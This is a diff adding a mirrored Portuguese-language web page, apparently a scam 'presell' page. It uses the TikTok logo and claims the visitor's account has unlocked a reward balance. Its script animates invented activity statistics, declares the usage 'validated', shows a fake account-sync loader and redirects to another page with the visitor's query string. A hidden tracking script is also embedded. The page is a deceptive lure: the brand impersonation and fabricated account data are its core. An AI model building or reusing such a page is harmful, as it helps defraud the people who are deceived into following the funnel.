@@ -1,0 +1,533 @@
+<!DOCTYPE html><html lang="pt-BR"><!-- Mirrored from rewards-tiktok.vercel.app/presell2.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 26 Jan 2026 20:50:04 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+  <meta charset="UTF-8">
+  <title>Validação de uso — Saldo liberado</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      background: linear-gradient(135deg, #fdf2f7, #fee2e2, #e0f2fe);
+      background-size: 200% 200%;
+      animation: bgMove 12s ease-in-out infinite;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    @keyframes bgMove {
+      0% {
+        background-position: 0% 50%;
+      }
+
+      50% {
+        background-position: 100% 50%;
+      }
+
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+
+    /* fundo de partículas */
+    #bgCanvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* animação de entrada do card */
+    @keyframes cardIn {
+      from {
+        opacity: 0;
+        transform: translateY(18px) scale(.97);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
+      border-radius: 22px;
+      box-shadow: 0 18px 40px rgba(0, 0, 0, .08);
+      padding: 24px 20px 22px;
+      position: relative;
+      z-index: 1;
+      animation: cardIn .4s ease-out;
+    }
+
+    /* logo pura no topo */
+    .logo-tk {
+      display: block;
+      width: 120px;
+      /* ajusta o tamanho que quiser */
+      height: auto;
+      margin: 0 auto 12px auto;
+      /* centralizada, com espaçamento embaixo */
+    }
+
+    h1 {
+      font-size: 22px;
+      line-height: 1.3;
+      color: #111827;
+      text-align: left;
+      margin-bottom: 6px;
+    }
+
+    h1 span {
+      color: #f43f5e;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #4b5563;
+      text-align: left;
+      margin-bottom: 18px;
+    }
+
+    /* bloco de estatísticas */
+    .stats {
+      background: #f9fafb;
+      border-radius: 16px;
+      padding: 14px 12px 10px;
+      margin-bottom: 16px;
+      border: 1px solid #e5e7eb;
+    }
+
+    .stats-title {
+      font-size: 12px;
+      color: #6b7280;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .stats-title-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 999px;
+      background: #22c55e;
+    }
+
+    .stat {
+      margin-bottom: 10px;
+    }
+
+    .stat:last-child {
+      margin-bottom: 0;
+    }
+
+    .stat-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 4px;
+    }
+
+    .stat-label {
+      font-size: 13px;
+      color: #374151;
+    }
+
+    .stat-value {
+      font-size: 12px;
+      color: #6b7280;
+    }
+
+    .stat-value.done {
+      color: #16a34a;
+      font-weight: 600;
+    }
+
+    .bar {
+      width: 100%;
+      height: 6px;
+      border-radius: 999px;
+      background: #e5e7eb;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .bar-fill {
+      height: 100%;
+      width: 0%;
+      border-radius: inherit;
+      background: linear-gradient(90deg, #f43f5e, #ec4899);
+      transition: width .25s ease-out;
+    }
+
+    .note {
+      font-size: 12px;
+      color: #6b7280;
+      text-align: center;
+      margin: 10px 0 14px;
+      min-height: 18px;
+    }
+
+    /* botão flutuante */
+    @keyframes floatBtn {
+      0% {
+        transform: translateY(0);
+        box-shadow: 0 10px 24px rgba(244, 63, 94, .35);
+      }
+
+      50% {
+        transform: translateY(-5px);
+        box-shadow: 0 18px 32px rgba(244, 63, 94, .5);
+      }
+
+      100% {
+        transform: translateY(0);
+        box-shadow: 0 10px 24px rgba(244, 63, 94, .35);
+      }
+    }
+
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      border: none;
+      outline: none;
+      border-radius: 999px;
+      padding: 13px 16px;
+      background: #f43f5e;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 10px 24px rgba(244, 63, 94, .4);
+      opacity: 0;
+      pointer-events: none;
+      transition: transform .12s, box-shadow .12s, opacity .12s;
+      margin-top: 4px;
+    }
+
+    .btn.visible {
+      opacity: 1;
+      pointer-events: auto;
+      animation: floatBtn 2.4s ease-in-out infinite;
+    }
+
+    .btn:hover {
+      animation: none;
+      transform: translateY(-2px);
+      box-shadow: 0 18px 36px rgba(244, 63, 94, .55);
+    }
+
+    .btn-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .small-text {
+      font-size: 11px;
+      color: #9ca3af;
+      text-align: center;
+      margin-top: 6px;
+    }
+
+    /* LOADER TIKTOK – tela branca com bolinha azul/rosa */
+    .tiktok-loader-overlay {
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+
+    .tiktok-loader-circle {
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      border: 6px solid rgba(0, 0, 0, 0.06);
+      border-top-color: #00f2ea;
+      border-right-color: #ff0050;
+      animation: tiktok-spin 1s linear infinite;
+      margin-bottom: 18px;
+    }
+
+    .tiktok-loader-text {
+      font-size: 14px;
+      color: #111827;
+      opacity: .7;
+    }
+
+    @keyframes tiktok-spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width:480px) {
+      .card {
+        padding: 20px 16px 18px;
+      }
+
+      h1 {
+        font-size: 20px;
+      }
+    }
+  </style>
+  </head><body><div style="display: none;">
+    <script id="_wau2ha">
+        var _wau = _wau || [];
+        _wau.push(["dynamic", "xyz312koi", "2ha", "c4302bffffff", "small"]);
+    </script>
+    <script async="" src="../waust.at/d.js"></script>
+  </div>
+  
+
+
+
+
+
+  <canvas id="bgCanvas" width="1920" height="1080"></canvas>
+
+  <div class="card">
+    <!-- LOGO PURA (sem badge, sem fundo extra) -->
+    <img src="images/tk-logo.png" alt="TikTok" class="logo-tk">
+    <br>
+    <h1>
+      Você atingiu todos os
+      <span>critérios de atividade.</span>
+    </h1>
+    <p class="subtitle">
+      Confirmamos que sua conta cumpriu os requisitos mínimos de uso. Confira o resumo abaixo e toque para liberar o seu
+      progresso.
+    </p>
+
+    <div class="stats" id="statsBox">
+      <div class="stats-title">
+        <span class="stats-title-dot"></span>
+        Detalhes da sua atividade
+      </div>
+
+      <!-- Vídeos assistidos 50/50 -->
+      <div class="stat" data-target="50">
+        <div class="stat-top">
+          <span class="stat-label">Vídeos assistidos</span>
+          <span class="stat-value">15/50</span>
+        </div>
+        <div class="bar">
+          <div class="bar-fill" style="width: 30%;"></div>
+        </div>
+      </div>
+
+      <!-- Tempo na plataforma 1000/1000 -->
+      <div class="stat" data-target="1000">
+        <div class="stat-top">
+          <span class="stat-label">Tempo em uso na plataforma</span>
+          <span class="stat-value">0/1000</span>
+        </div>
+        <div class="bar">
+          <div class="bar-fill"></div>
+        </div>
+      </div>
+
+      <!-- Vídeos curtidos 100/100 -->
+      <div class="stat" data-target="100">
+        <div class="stat-top">
+          <span class="stat-label">Vídeos curtidos</span>
+          <span class="stat-value">0/100</span>
+        </div>
+        <div class="bar">
+          <div class="bar-fill"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="note" id="noteText">Analisando seus vídeos assistidos…</div>
+
+    <button class="btn" id="claimBtn">
+      <span class="btn-icon">
+        <!-- ícone de moeda -->
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-coin" viewBox="0 0 16 16">
+          <path d="M5.5 9.511c.076.954.83 1.697 2.182 1.785V12h.6v-.709c1.4-.098 2.218-.846 2.218-1.932 0-.987-.626-1.496-1.745-1.76l-.473-.112V5.57c.6.068.982.396 1.074.85h1.052c-.076-.919-.864-1.638-2.126-1.716V4h-.6v.719c-1.195.117-2.01.836-2.01 1.853 0 .9.606 1.472 1.613 1.707l.397.098v2.034c-.615-.093-1.022-.43-1.114-.9zm2.177-2.166c-.59-.137-.91-.416-.91-.836 0-.47.345-.822.915-.925v1.76h-.005zm.692 1.193c.717.166 1.048.435 1.048.91 0 .542-.412.914-1.135.982V8.518z">
+          </path>
+          <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"></path>
+          <path d="M8 13.5a5.5 5.5 0 1 1 0-11 5.5 5.5 0 0 1 0 11m0 .5A6 6 0 1 0 8 2a6 6 0 0 0 0 12"></path>
+        </svg>
+      </span>
+      Liberar meu progresso
+    </button>
+
+    <div class="small-text">
+      Os dados acima são gerados automaticamente com base na sua interação recente na plataforma.
+    </div>
+  </div>
+
+  <!-- LOADER TIKTOK -->
+  <div class="tiktok-loader-overlay" id="tiktok-loader">
+    <div class="tiktok-loader-circle"></div>
+    <div class="tiktok-loader-text">Sincronizando com a sua conta...</div>
+  </div>
+
+  <script>
+    /* --------- ANIMAÇÃO DAS ESTATÍSTICAS --------- */
+    const stats = Array.from(document.querySelectorAll('.stat'));
+    const noteText = document.getElementById('noteText');
+    const claimBtn = document.getElementById('claimBtn');
+
+    const labelsText = [
+      'Analisando seus vídeos assistidos…',
+      'Conferindo seu tempo ativo na plataforma…',
+      'Verificando suas interações (curtidas)…',
+      'Pronto! Seu uso foi validado. Toque para liberar o progresso.'
+    ];
+
+    function animateStat(index) {
+      const stat = stats[index];
+      const target = parseInt(stat.getAttribute('data-target'), 10);
+      const valueEl = stat.querySelector('.stat-value');
+      const barFill = stat.querySelector('.bar-fill');
+
+      let current = 0;
+
+      let step = 1;
+      if (target > 200) step = 20;
+      if (target > 600) step = 40;
+
+      noteText.textContent = labelsText[index] || '';
+
+      const interval = setInterval(() => {
+        current += step;
+        if (current >= target) {
+          current = target;
+        }
+
+        valueEl.textContent = current + '/' + target;
+
+        const pct = Math.min(100, (current / target) * 100);
+        barFill.style.width = pct + '%';
+
+        if (current >= target) {
+          clearInterval(interval);
+          valueEl.classList.add('done');
+
+          if (index < stats.length - 1) {
+            setTimeout(() => {
+              animateStat(index + 1);
+            }, 400);
+          } else {
+            noteText.textContent = labelsText[3];
+            claimBtn.classList.add('visible');
+          }
+        }
+      }, 40);
+    }
+
+    animateStat(0);
+
+    /* --------- LOADER TIKTOK E REDIRECIONAMENTO --------- */
+    function mostrarLoaderTikTok() {
+      const loader = document.getElementById('tiktok-loader');
+      loader.style.display = 'flex';
+      setTimeout(() => {
+        window.location.href = '../inicio/public/index.php' + window.location.search;
+      }, 3000);
+    }
+
+    claimBtn.addEventListener('click', () => {
+      mostrarLoaderTikTok();
+    });
+
+    /* --------- FUNDO DE PARTÍCULAS --------- */
+    const canvas = document.getElementById('bgCanvas');
+    const ctx = canvas.getContext('2d');
+    let particles = [];
+    let width = window.innerWidth;
+    let height = window.innerHeight;
+
+    function resizeCanvas() {
+      width = window.innerWidth;
+      height = window.innerHeight;
+      const ratio = window.devicePixelRatio || 1;
+      canvas.width = width * ratio;
+      canvas.height = height * ratio;
+      ctx.setTransform(ratio, 0, 0, ratio, 0, 0);
+    }
+
+    function createParticles(count) {
+      const palette = [
+        { r: 244, g: 63, b: 94 },
+        { r: 56, g: 189, b: 248 },
+        { r: 248, g: 250, b: 252 }
+      ];
+      particles = [];
+      for (let i = 0; i < count; i++) {
+        const color = palette[Math.floor(Math.random() * palette.length)];
+        particles.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          r: 2 + Math.random() * 3.5,
+          speedY: 0.25 + Math.random() * 0.6,
+          speedX: (Math.random() - 0.5) * 0.4,
+          alpha: 0.4 + Math.random() * 0.4,
+          color
+        });
+      }
+    }
+
+    function drawParticles() {
+      ctx.clearRect(0, 0, width, height);
+      particles.forEach(p => {
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+        ctx.fillStyle = 'rgba(' + p.color.r + ',' + p.color.g + ',' + p.color.b + ',' + p.alpha + ')';
+        ctx.fill();
+
+        p.y += p.speedY;
+        p.x += p.speedX;
+
+        if (p.y - p.r > height) {
+          p.y = -p.r;
+          p.x = Math.random() * width;
+        }
+        if (p.x < -10) p.x = width + 10;
+        if (p.x > width + 10) p.x = -10;
+      });
+      requestAnimationFrame(drawParticles);
+    }
+
+    window.addEventListener('resize', () => {
+      resizeCanvas();
+      createParticles(45);
+    });
+
+    resizeCanvas();
+    createParticles(45);
+    drawParticles();
+  </script>
+
+
+
+
+
+
+
+
+</body></html>
